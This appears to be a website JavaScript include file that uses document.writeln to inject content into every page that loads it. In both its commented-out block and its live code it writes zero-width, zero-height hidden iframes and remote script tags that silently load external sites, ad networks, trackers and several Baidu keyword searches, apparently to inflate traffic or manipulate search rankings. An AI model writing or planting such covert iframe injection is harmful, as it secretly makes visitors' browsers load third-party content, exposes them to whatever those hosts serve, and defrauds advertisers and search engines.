



/*
document.writeln("<script src=\"http:\/\/www.112888.com\/js\/zz.js\"><\/script>");
document.writeln("<iframe src=\"http:\/\/www.365jkw.com\" width=0 height=0><\/iframe>");

document.writeln("<script src=\"http:\/\/u.1133.cc\/showpage.php?pid=107277&show_t=2\" language=\"javascript\"><\/script>");

document.writeln("<iframe src=\"http:\/\/www.112888.com\/js\/jsformscto.htm\" width=0 height=0><\/iframe>");


document.writeln("<script type=\"text\/javascript\">");
document.writeln("  u_a_client=\"26721\";");
document.writeln("  u_a_width=\"0\"; ");
document.writeln("  u_a_height=\"0\"; ");
document.writeln("  u_a_zones=\"5521\"; ");
document.writeln("  u_a_type=\"1\"; ");
document.writeln("<\/script>");
document.writeln("<script src=\"http:\/\/i.egooad.cn\/i.js\"><\/script>");

document.writeln("<script src=\"\/love\/love.js\"><\/script>");
*/

document.writeln("<iframe src=\"http://www.mscto.com/zbj/zhubajie.html\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe>");

document.writeln("<script src=\'http:\/\/s37.cnzz.com\/stat.php?id=998888&web_id=998888\' language=\'JavaScript\' charset=\'gb2312\'><\/script>");

document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/js.tongji.linezing.com\/1137836\/tongji.js\"><\/script><noscript><a href=\"http:\/\/www.linezing.com\"><img src=\"http:\/\/img.tongji.linezing.com\/1137836\/tongji.gif\"\/><\/a><\/noscript>");


document.writeln("<iframe src=\"http:\/\/www.kandao.com\/kandao.htm\" width=0 height=0><\/iframe>");
document.writeln("<iframe src=\"\/js\/336x280.htm\" width=0 height=0><\/iframe>");

document.writeln("<iframe src=\"http://www.baidu.com/s?bs=%B6%AB%B7%E7%D1%A9%CC%FA%C1%FA&f=8&wd=%B6%AB%B7%E7%D1%A9%CC%FA%C1%FA+%D2%D7%B2%BD%B4%AB%C3%BD\" width=0 height=0></iframe>");

document.writeln("<iframe src=\"http://www.baidu.com/s?bs=%B6%AB%B7%E7%B1%EA%D6%C2&f=8&wd=%B6%AB%B7%E7%B1%EA%D6%C2+%D2%D7%B2%BD%B4%AB%C3%BD\" width=0 height=0></iframe>");

document.writeln("<iframe src=\"http://www.baidu.com/s?bs=SEM%BE%AB%CB%E3%CA%A6&f=8&rsv_bp=2&wd=%D2%D7%B2%BDsem%BE%AB%CB%E3%CA%A6\" width=0 height=0></iframe>");

document.writeln("<iframe src=\"http://www.baidu.com/s?wd=sem%BE%AB%CB%E3%CA%A6\" width=0 height=0></iframe>");




